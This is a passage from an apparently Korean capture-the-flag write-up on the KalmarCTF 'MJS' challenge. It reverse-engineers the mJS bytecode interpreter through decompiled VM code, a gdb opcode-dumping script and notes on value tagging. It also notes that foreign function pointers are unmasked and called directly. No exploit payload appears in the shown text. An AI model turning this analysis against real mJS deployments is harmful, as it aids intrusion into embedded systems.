[rbp-278h] mjs *v47; // [rsp+70h] [rbp-270h] mjs *v48; // [rsp+78h] [rbp-268h] mjs_val_t v49; // [rsp+80h] [rbp-260h] mjs *v50; // [rsp+88h] [rbp-258h] mbuf *p_arg_stack; // [rsp+90h] [rbp-250h] mjs *v52; // [rsp+98h] [rbp-248h] mjs *v53; // [rsp+A0h] [rbp-240h] mjs *v54; // [rsp+A8h] [rbp-238h] mjs *v55; // [rsp+B0h] [rbp-230h] mjs *v56; // [rsp+B8h] [rbp-228h] mbuf *m; // [rsp+C0h] [rbp-220h] mjs *v58; // [rsp+C8h] [rbp-218h] mjs *v59; // [rsp+D0h] [rbp-210h] mjs *v60; // [rsp+D8h] [rbp-208h] mjs *v61; // [rsp+E0h] [rbp-200h] mjs *v62; // [rsp+E8h] [rbp-1F8h] mjs *v63; // [rsp+F0h] [rbp-1F0h] mjs *v64; // [rsp+F8h] [rbp-1E8h] mjs *v65; // [rsp+100h] [rbp-1E0h] mjs *v66; // [rsp+108h] [rbp-1D8h] mjs *v67; // [rsp+110h] [rbp-1D0h] mjs *v68; // [rsp+118h] [rbp-1C8h] size_t scopes_len_1; // [rsp+128h] [rbp-1B8h] size_t scopes_len_0; // [rsp+130h] [rbp-1B0h] int off_0; // [rsp+13Ch] [rbp-1A4h] int off_0a; // [rsp+13Ch] [rbp-1A4h] int l2; // [rsp+140h] [rbp-1A0h] BYREF int l1; // [rsp+144h] [rbp-19Ch] BYREF mjs_val_t b; // [rsp+148h] [rbp-198h] mjs_val_t a; // [rsp+150h] [rbp-190h] int op; // [rsp+15Ch] [rbp-184h] size_t retval_pos; // [rsp+160h] [rbp-180h] mjs_val_t v; // [rsp+168h] [rbp-178h] mjs_val_t key_3; // [rsp+170h] [rbp-170h] mjs_val_t obj_2; // [rsp+178h] [rbp-168h] int v82; // [rsp+180h] [rbp-160h] int n_7; // [rsp+184h] [rbp-15Ch] int llen2; // [rsp+188h] [rbp-158h] BYREF int llen1; // [rsp+18Ch] [rbp-154h] BYREF size_t off_call; // [rsp+190h] [rbp-150h] mjs_val_t retval_stack_idx; // [rsp+198h] [rbp-148h] mjs_val_t *func; // [rsp+1A0h] [rbp-140h] int func_pos; // [rsp+1ACh] [rbp-134h] size_t off_ret; // [rsp+1B0h] [rbp-130h] mjs_val_t scope; // [rsp+1B8h] [rbp-128h] mjs_val_t key_2; // [rsp+1C0h] [rbp-120h] mjs_val_t name; // [rsp+1C8h] [rbp-118h] mjs_val_t obj_1; // [rsp+1D0h] [rbp-110h] mjs_val_t *iterator; // [rsp+1D8h] [rbp-108h] int n_6; // [rsp+1E0h] [rbp-100h] int llen_6; // [rsp+1E4h] [rbp-FCh] BYREF int64_t n_5; // [rsp+1E8h] [rbp-F8h] int llen_5; // [rsp+1F4h] [rbp-ECh] BYREF int length; // [rsp+1F8h] [rbp-E8h] int llen_4; // [rsp+1FCh] [rbp-E4h] BYREF mjs_val_t val_0; // [rsp+200h] [rbp-E0h] BYREF mjs_val_t key_1; // [rsp+208h] [rbp-D8h] mjs_val_t obj_0; // [rsp+210h] [rbp-D0h] mjs_val_t arr; // [rsp+220h] [rbp-C0h] mjs_val_t val; // [rsp+228h] [rbp-B8h] mjs_val_t key_0; // [rsp+230h] [rbp-B0h] mjs_val_t obj; // [rsp+238h] [rbp-A8h] mjs_val_t key; // [rsp+240h] [rbp-A0h] int n_3; // [rsp+24Ch] [rbp-94h] int llen_3; // [rsp+250h] [rbp-90h] BYREF int n_2; // [rsp+254h] [rbp-8Ch] int llen_2; // [rsp+258h] [rbp-88h] BYREF int n_1; // [rsp+25Ch] [rbp-84h] int llen_1; // [rsp+260h] [rbp-80h] BYREF int n_0; // [rsp+264h] [rbp-7Ch] int llen_0; // [rsp+268h] [rbp-78h] BYREF int n; // [rsp+26Ch] [rbp-74h] int llen; // [rsp+270h] [rbp-70h] BYREF mjs_header_item_t bcode_offset; // [rsp+274h] [rbp-6Ch] mjs_bcode_part bp_0; // [rsp+278h] [rbp-68h] const uint8_t *code; // [rsp+298h] [rbp-48h] size_t start_off; // [rsp+2A0h] [rbp-40h] int loop_addresses_len; // [rsp+2A8h] [rbp-38h] int scopes_len; // [rsp+2ACh] [rbp-34h] int len; // [rsp+2B0h] [rbp-30h] int call_stack_len; // [rsp+2B4h] [rbp-2Ch] int stack_len; // [rsp+2B8h] [rbp-28h] uint8_t opcode; // [rsp+2BEh] [rbp-22h] uint8_t prev_opcode; // [rsp+2BFh] [rbp-21h] size_t i; // [rsp+2C0h] [rbp-20h] mjs_val_t *resa; // [rsp+2C8h] [rbp-18h] size_t offa; // [rsp+2D0h] [rbp-10h] mjs *mjsa; // [rsp+2D8h] [rbp-8h] mjsa = mjs; offa = off; resa = res; prev_opcode = 0x27; opcode = 0x27; stack_len = mjs-\u0026gt;stack.len; call_stack_len = mjs-\u0026gt;call_stack.len; len = mjs-\u0026gt;arg_stack.len; scopes_len = mjs-\u0026gt;scopes.len; loop_addresses_len = mjs-\u0026gt;loop_addresses.len; start_off = off; bp_0 = *mjs_bcode_part_get_by_offset(mjs, off); mjs_set_errorf(mjs, MJS_OK, 0LL); free(mjs-\u0026gt;stack_trace); mjs-\u0026gt;stack_trace = 0LL; offa -= bp_0.start_idx; i = offa; while ( 2 ) { if ( i \u0026gt;= bp_0.data.len ) goto clean; mjsa-\u0026gt;cur_bcode_offset = i; if ( (*((_BYTE *)mjsa + 464) \u0026amp; 2) != 0 \u0026amp;\u0026amp; maybe_gc(mjsa) ) *((_BYTE *)mjsa + 464) \u0026amp;= ~2u; code = (const uint8_t *)bp_0.data.p; mjs_disasm_single((const uint8_t *)bp_0.data.p, i); prev_opcode = opcode; opcode = code[i]; switch ( opcode ) { case 0u: goto LABEL_93; case 1u: mjs_pop(mjsa); goto LABEL_93; case 2u: v47 = mjsa; v24 = vtop(\u0026amp;mjsa-\u0026gt;stack); mjs_push(v47, v24); goto LABEL_93; case 3u: a = mjs_pop(mjsa); b = mjs_pop(mjsa); mjs_push(mjsa, a); mjs_push(mjsa, b); goto LABEL_93; case 4u: n_0 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_0); i += llen_0 + n_0; goto LABEL_93; case 6u: n_2 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_2); i += llen_2; v60 = mjsa; v11 = vtop(\u0026amp;mjsa-\u0026gt;stack); if ( mjs_is_truthy(v60, v11) ) i += n_2; goto LABEL_93; case 7u: n_1 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_1); i += llen_1; v61 = mjsa; v10 = mjs_pop(mjsa); if ( !mjs_is_truthy(v61, v10) ) { mjs_push(mjsa, 0xFFF3000000000000LL); i += n_1; } goto LABEL_93; case 8u: n_3 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_3); i += llen_3; v59 = mjsa; v12 = vtop(\u0026amp;mjsa-\u0026gt;stack); if ( !mjs_is_truthy(v59, v12) ) i += n_3; goto LABEL_93; case 9u: key = vtop(\u0026amp;mjsa-\u0026gt;stack); v58 = mjsa; v13 = mjs_find_scope(mjsa, key); mjs_push(v58, v13); goto LABEL_93; case 0xAu: if ( !mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt; 0\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x2D5u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); v56 = mjsa; v15 = vtop(\u0026amp;mjsa-\u0026gt;scopes); mjs_push(v56, v15); goto LABEL_93; case 0xBu: length = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; case 0xCu: v65 = mjsa; v6 = mjs_mk_boolean(mjsa, 1); mjs_push(v65, v6); goto LABEL_93; case 0xDu: v66 = mjsa; v5 = mjs_mk_boolean(mjsa, 0); mjs_push(v66, v5); goto LABEL_93; case 0xEu: n_5 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_5); v54 = mjsa; v17 = mjs_mk_number(mjsa, (double)(int)n_5); mjs_push(v54, v17); i += llen_5; goto LABEL_93; case 0xFu: n_6 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_6); v53 = mjsa; v52 = mjsa; v18 = strtod((const char *)\u0026amp;code[i + 1 + llen_6], 0LL); v19 = mjs_mk_number(v52, v18); mjs_push(v53, v19); i += n_6 + llen_6; goto LABEL_93; case 0x10u: v68 = mjsa; v3 = mjs_mk_null(); mjs_push(v68, v3); goto LABEL_93; case 0x11u: v67 = mjsa; v4 = mjs_mk_undefined(); mjs_push(v67, v4); goto LABEL_93; case 0x12u: v64 = mjsa; v7 = mjs_mk_object(mjsa); mjs_push(v64, v7); goto LABEL_93; case 0x13u: v63 = mjsa; v8 = mjs_mk_array(mjsa); mjs_push(v63, v8); goto LABEL_93; case 0x14u: n = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen); v62 = mjsa; v9 = mjs_mk_function(mjsa, i + bp_0.start_idx - n); mjs_push(v62, v9); i += llen; goto LABEL_93; case 0x15u: mjs_push(mjsa, mjsa-\u0026gt;vals.this_obj); goto LABEL_93; case 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026amp;val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u0026gt; GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;type error\u0026#34;); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u0026gt;vals.last_getprop_obj = obj_0; goto LABEL_93; case 0x17u: obj = mjs_pop(mjsa); key_0 = mjs_pop(mjsa); if ( !mjs_get_own_property_v(mjsa, obj, key_0) ) mjs_set_v(mjsa, obj, key_0, 0xFFF3000000000000LL); goto LABEL_93; case 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; goto LABEL_93; case 0x19u: val = mjs_pop(mjsa); arr = mjs_pop(mjsa); if ( mjs_array_push(mjsa, arr, val) ) mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;append to non-array\u0026#34;); goto LABEL_93; case 0x1Au: v82 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen1); n_7 = cs_varint_decode_unsafe(\u0026amp;code[llen1 + 1 + i], \u0026amp;llen2); key_3 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen1 + llen2], n_7, 1); obj_2 = vtop(\u0026amp;mjsa-\u0026gt;scopes); v = mjs_arg(mjsa, v82); mjs_set_v(mjsa, obj_2, key_3, v); i += n_7 + llen2 + llen1; goto LABEL_93; case 0x1Bu: m = \u0026amp;mjsa-\u0026gt;scopes; v14 = mjs_mk_object(mjsa); push_mjs_val(m, v14); goto LABEL_93; case 0x1Cu: if ( mjsa-\u0026gt;scopes.len \u0026gt; 1 ) mjs_pop_val(\u0026amp;mjsa-\u0026gt;scopes); else mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \u0026#34;scopes underflow\u0026#34;); goto LABEL_93; case 0x1Du: retval_stack_idx = vtop(\u0026amp;mjsa-\u0026gt;arg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026amp;mjsa-\u0026gt;stack, func_pos); // get pointer mjs_pop_val(\u0026amp;mjsa-\u0026gt;arg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;calling non-callable\u0026#34;); } goto LABEL_93; case 0x1Eu: off_ret = call_stack_restore_frame(mjsa); if ( off_ret == 0x7FFFFFFF ) goto clean; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_ret); code = (const uint8_t *)bp_0.data.p; i = off_ret - bp_0.start_idx; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_exec.c\u0026#34;, 781) ) cs_log_printf(\u0026#34;RETURNING TO %d\u0026#34;, (unsigned int)(off_ret + 1)); LABEL_93: if ( mjsa-\u0026gt;error == MJS_OK ) { ++i; continue; } mjs_gen_stack_trace(mjsa, i + bp_0.start_idx - 1); mjsa-\u0026gt;stack.len = stack_len; mjsa-\u0026gt;call_stack.len = call_stack_len; mjsa-\u0026gt;arg_stack.len = len; mjsa-\u0026gt;scopes.len = scopes_len; mjsa-\u0026gt;loop_addresses.len = loop_addresses_len; mjs_push(mjsa, 0xFFF3000000000000LL); clean: error = mjsa-\u0026gt;error; v35 = mjs_bcode_part_get_by_offset(mjsa, start_off); *((_BYTE *)v35 + 24) = error \u0026amp; 0xF | *((_BYTE *)v35 + 24) \u0026amp; 0xF0; v36 = mjs_pop(mjsa); *resa = v36; return mjsa-\u0026gt;error; case 0x1Fu: off_0 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;l1); v43 = mjsa; p_loop_addresses = \u0026amp;mjsa-\u0026gt;loop_addresses; v25 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v26 = mjs_mk_number(v43, _mm_unpackhi_pd(v25, v25).m128d_f64[0] + v25.m128d_f64[0]); push_mjs_val(p_loop_addresses, v26); v45 = \u0026amp;mjsa-\u0026gt;loop_addresses; v27 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v28 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v27, v27).m128d_f64[0] + v27.m128d_f64[0]); push_mjs_val(v45, v28); off_0a = cs_varint_decode_unsafe(\u0026amp;code[l1 + 1 + i], \u0026amp;l2); v46 = \u0026amp;mjsa-\u0026gt;loop_addresses; v29 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0a + l2 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v30 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v29, v29).m128d_f64[0] + v29.m128d_f64[0]); push_mjs_val(v46, v30); i += l2 + l1; goto LABEL_93; case 0x20u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;loop_addresses) \u0026lt; 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \u0026#34;misplaced \u0026#39;break\u0026#39;\u0026#34;); } else { mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); v39 = mjsa; v33 = mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); i = mjs_get_int(v39, v33) - 1; v40 = mjsa; v34 = mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); scopes_len_1 = mjs_get_int(v40, v34); if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) \u0026lt; scopes_len_1 ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt;= scopes_len\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x3B5u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); mjsa-\u0026gt;scopes.len = 8 * scopes_len_1; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_exec.c\u0026#34;, 952) ) cs_log_printf(\u0026#34;BREAKING TO %d\u0026#34;, (unsigned int)(i + 1)); } goto LABEL_93; case 0x21u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;loop_addresses) \u0026lt; 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \u0026#34;misplaced \u0026#39;continue\u0026#39;\u0026#34;); } else { v42 = mjsa; v31 = vptr(\u0026amp;mjsa-\u0026gt;loop_addresses, -3); scopes_len_0 = mjs_get_int(v42, *v31); if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) \u0026lt; scopes_len_0 ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt;= scopes_len\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x3A1u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); mjsa-\u0026gt;scopes.len = 8 * scopes_len_0; v41 = mjsa; v32 = vtop(\u0026amp;mjsa-\u0026gt;loop_addresses); i = mjs_get_int(v41, v32) - 1; } goto LABEL_93; case 0x22u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;call_stack) \u0026gt;= 5 ) { v48 = mjsa; v23 = vptr(\u0026amp;mjsa-\u0026gt;call_stack, -1); retval_pos = mjs_get_int(v48, *v23); v49 = mjs_pop(mjsa); *vptr(\u0026amp;mjsa-\u0026gt;stack, (int)retval_pos - 1) = v49; } else { mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \u0026#34;cannot return\u0026#34;); } goto LABEL_93; case 0x23u: i = bp_0.data.len; goto LABEL_93; case 0x24u: bcode_offset = *(_DWORD *)\u0026amp;code[i + 5]; i += bcode_offset; goto LABEL_93; case 0x25u: if ( prev_opcode != 22 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; push_mjs_val(\u0026amp;mjsa-\u0026gt;arg_stack, mjsa-\u0026gt;vals.last_getprop_obj); v50 = mjsa; p_arg_stack = \u0026amp;mjsa-\u0026gt;arg_stack; v20 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026amp;mjsa-\u0026gt;stack), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v21 = mjs_mk_number(v50, _mm_unpackhi_pd(v20, v20).m128d_f64[0] + v20.m128d_f64[0]); push_mjs_val(p_arg_stack, v21); goto LABEL_93; case 0x26u: iterator = vptr(\u0026amp;mjsa-\u0026gt;stack, -1); obj_1 = *vptr(\u0026amp;mjsa-\u0026gt;stack, -2); if ( mjs_is_object(obj_1) ) { name = *vptr(\u0026amp;mjsa-\u0026gt;stack, -3); key_2 = mjs_next(mjsa, obj_1, iterator); if ( key_2 != 0xFFF3000000000000LL ) { scope = mjs_find_scope(mjsa, name); mjs_set_v(mjsa, scope, name, key_2); } } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;can\u0026#39;t iterate over non-object value\u0026#34;); } goto LABEL_93; default: mjs_dump(mjsa, 1); mjs_set_errorf( mjsa, MJS_INTERNAL_ERROR, \u0026#34;Unknown opcode: %d, off %d+%d\u0026#34;, opcode, LODWORD(bp_0.start_idx), (unsigned int)i); i = bp_0.data.len; goto LABEL_93; } } } 이 함수에서 VM이 돌아간다.\n직접 OPCODE를 분석해보기 위해서 gdbscript를 작성했다.\nimport gdb gdb.execute(\u0026#34;start\u0026#34;) res = gdb.execute(\u0026#34;vmmap\u0026#34;,to_string=True) res =res[230:] binbase = int(res[res.find(\u0026#39;0x\u0026#39;) : res.find(\u0026#39;0x\u0026#39;)+8*2+2],16) bp_off = [0x007219] for i in bp_off: gdb.execute(\u0026#34;b * \u0026#34;+hex(binbase + i)) gdb.execute(\u0026#34;c\u0026#34;) opcode = [] l = 8 for i in range(l): rax = int(gdb.parse_and_eval(\u0026#34;$rax\u0026#34;)) opcode.append(rax) gdb.execute(\u0026#34;c\u0026#34;) print(i) print(opcode) OPCODE를 배열을 뽑아볼 수 있었다. [36, 11, 9, 22, 37, 11, 29, 35] 분석을 편하게 하기 위해서 파이썬 스크립트를 작성했다.\nstr_ = \u0026#39;\u0026#39;\u0026#39;enum mjs_opcode { OP_NOP, /* ( -- ) */ OP_DROP, /* ( a -- ) */ OP_DUP, /* ( a -- a a ) */ OP_SWAP, /* ( a b -- b a ) */ OP_JMP, /* ( -- ) */ OP_JMP_TRUE, /* ( -- ) */ OP_JMP_NEUTRAL_TRUE, /* ( -- ) */ OP_JMP_FALSE, /* ( -- ) */ OP_JMP_NEUTRAL_FALSE, /* ( -- ) */ OP_FIND_SCOPE, /* ( a -- a b ) */ OP_PUSH_SCOPE, /* ( -- a ) */ OP_PUSH_STR, /* ( -- a ) */ OP_PUSH_TRUE, /* ( -- a ) */ OP_PUSH_FALSE, /* ( -- a ) */ OP_PUSH_INT, /* ( -- a ) */ OP_PUSH_DBL, /* ( -- a ) */ OP_PUSH_NULL, /* ( -- a ) */ OP_PUSH_UNDEF, /* ( -- a ) */ OP_PUSH_OBJ, /* ( -- a ) */ OP_PUSH_ARRAY, /* ( -- a ) */ OP_PUSH_FUNC, /* ( -- a ) */ OP_PUSH_THIS, /* ( -- a ) */ OP_GET, /* ( key obj -- obj[key] ) */ OP_CREATE, /* ( key obj -- ) */ OP_EXPR, /* ( ... -- a ) */ OP_APPEND, /* ( a b -- ) */ OP_SET_ARG, /* ( a -- a ) */ OP_NEW_SCOPE, /* ( -- ) */ OP_DEL_SCOPE, /* ( -- ) */ OP_CALL, /* ( func param1 param2 ... num_params -- result ) */ OP_RETURN, /* ( -- ) */ OP_LOOP, /* ( -- ) Push break \u0026amp; continue addresses to loop_labels */ OP_BREAK, /* ( -- ) */ OP_CONTINUE, /* ( -- ) */ OP_SETRETVAL, /* ( a -- ) */ OP_EXIT, /* ( -- ) */ OP_BCODE_HEADER, /* ( -- ) */ OP_ARGS, /* ( -- ) Mark the beginning of function call arguments */ OP_FOR_IN_NEXT, /* ( name obj iter_ptr -- name obj iter_ptr_next ) */ OP_MAX\u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39; \u0026#39;,\u0026#39;\u0026#39;) str_ = (str_.split(\u0026#39;,\u0026#39;)) OPCODE = [36, 11, 9, 22, 37, 11, 29, 35] # OPCODE =[36, 11, 9, 22, 35] # OPCODE = [36, 11, 10, 23, 11, 9, 11, 9, 22, 24] for op in OPCODE: k=0 for i in str_: if op == k: print(i[i.find(\u0026#34;OP_\u0026#34;):] + \u0026#39; = \u0026#39;+ hex(k)) k+=1 root@ed1ff428eb33 ~/Desktop/Kalmar/MJS - KalmarCTF ❯ python3 print_opcode.py OP_BCODE_HEADER = 0x24 OP_PUSH_STR = 0xb OP_FIND_SCOPE = 0x9 OP_GET = 0x16 OP_ARGS = 0x25 OP_PUSH_STR = 0xb OP_CALL = 0x1d OP_EXIT = 0x23 case 0xBu: length = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; OP_PUSH_STR은 그냥 문자열을 약간의 가공을 해서 스택에 push하는 명령이다.\n0xfff700746e697270 뒤에는 그냥 아스키고 앞에 0xfff7을 추가해준다. 길이에 따라 로직이 다르지만, print 문자열에 한에서는 위 값이 push된다.\nvoid __cdecl mjs_push(mjs *mjs, mjs_val_t v) { push_mjs_val(\u0026amp;mjs-\u0026gt;stack, v); } void __cdecl push_mjs_val(mbuf *m, mjs_val_t v) { mjs_val_t va; // [rsp+0h] [rbp-10h] BYREF mbuf *ma; // [rsp+8h] [rbp-8h] ma = m; va = v; mbuf_append(m, \u0026amp;va, 8uLL); } size_t __cdecl mbuf_append(mbuf *a, const void *buf, size_t len) { return mbuf_insert(a, a-\u0026gt;len, buf, len); } OP_FIND_SCOPE는 현재 스코프를 찾는 명령이다. OP_CREATE 같은 명령을 수행할때, SCOPE에 값이 추가된다.\n0xfff1561eb4251558 vm stack에 push 되는 값은 위와 같은 주소값이다. 0xfff1이 마스크? 이고 하위 6바이트가 주소로 쓰인다.\nint __cdecl mjs_is_object(mjs_val_t v) { bool v2; // [rsp+1h] [rbp-9h] v2 = 1; if ( (v \u0026amp; 0xFFFF000000000000LL) != 0xFFF1000000000000LL ) return (v \u0026amp; 0xFFFF000000000000LL) == 0xFFFC000000000000LL; return v2; } mjs_is_object 함수가 비교하는 것을 보면, 오브젝트임을 알 수 있다.\nint mjs_is_object(mjs_val_t v) { return (v \u0026amp; MJS_TAG_MASK) == MJS_TAG_OBJECT || (v \u0026amp; MJS_TAG_MASK) == MJS_TAG_ARRAY; } OP_GET은 함수의 주소를 찾을때 사용하는 명령어이다.\ncase 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026amp;val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u0026gt; GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;type error\u0026#34;); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u0026gt;vals.last_getprop_obj = obj_0; goto LABEL_93; 그 scope의 object에서 key값으로 값을 찾아서 proto?를 얻어서 vm stack에 push한다.\nOP_ARGS는 그냥 인자를 맞춰주는 부분이다. 분석은 안했다.\nOP_CALL은 함수를 호출해준다.\ncase 0x1Du: retval_stack_idx = vtop(\u0026amp;mjsa-\u0026gt;arg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026amp;mjsa-\u0026gt;stack, func_pos); // get pointer mjs_pop_val(\u0026amp;mjsa-\u0026gt;arg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;calling non-callable\u0026#34;); } goto LABEL_93; mjs_print는 foreign이다.\nint __cdecl mjs_is_foreign(mjs_val_t v) { return (v \u0026amp; 0xFFFF000000000000LL) == 0xFFF2000000000000LL; } OP_GET에서 가져온 함수의 주소의 마스크가 0xfff2이기 때문이다.\nvoid *__cdecl mjs_get_ptr(mjs *mjs, mjs_val_t v) { if ( mjs_is_foreign(v) ) return get_ptr(v); else return 0LL; } void *__cdecl get_ptr(mjs_val_t v) { return (void *)(v \u0026amp; 0xFFFFFFFFFFFFLL); } 실제로 ptr을 가져올때 마스크는 빼고 본다. 즉 실제 주소를 가져와서 그냥 호출한다.\nOP_EXPR은 어떤 변수에 저장할때 있었던 OPCODE이다. OP_EXPR도 한번 살펴보면, 다음과 같다.\ncase 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; void __cdecl exec_expr(mjs *mjs, int op) { mjs_val_t v2; // rax mjs_val_t v3; // rax mjs_val_t v4; // rax int is_truthy; // eax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax int v9; // eax mjs_val_t v10; // rax int v11; // eax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax mjs_val_t v18; // rax mjs_val_t v19; // rax mjs_val_t v20; // rax mjs_val_t v21; // rax mjs_val_t v22; // rax mjs_val_t v23; // rax mjs_val_t v24; // rax mjs_val_t v25; // rax mjs_val_t v26; // rax mjs_val_t v27; // rax mjs_val_t v28; // rax mjs_val_t v29; // rax const char *v30; // rax mjs_val_t v31; // rax mjs_val_t v32; // [rsp+18h] [rbp-228h] mjs_val_t v; // [rsp+28h] [rbp-218h] mjs_val_t v34; // [rsp+38h] [rbp-208h] mjs_val_t v35; // [rsp+48h] [rbp-1F8h] mjs_val_t v_2; // [rsp+110h] [rbp-130h] mjs_val_t key_3; // [rsp+118h] [rbp-128h] mjs_val_t obj_3; // [rsp+120h] [rbp-120h] mjs_val_t v_1; // [rsp+128h] [rbp-118h] mjs_val_t key_2; // [rsp+130h] [rbp-110h] mjs_val_t obj_2; // [rsp+138h] [rbp-108h] mjs_val_t v1_0; // [rsp+140h] [rbp-100h] mjs_val_t key_1; // [rsp+150h] [rbp-F0h] mjs_val_t obj_1; // [rsp+158h] 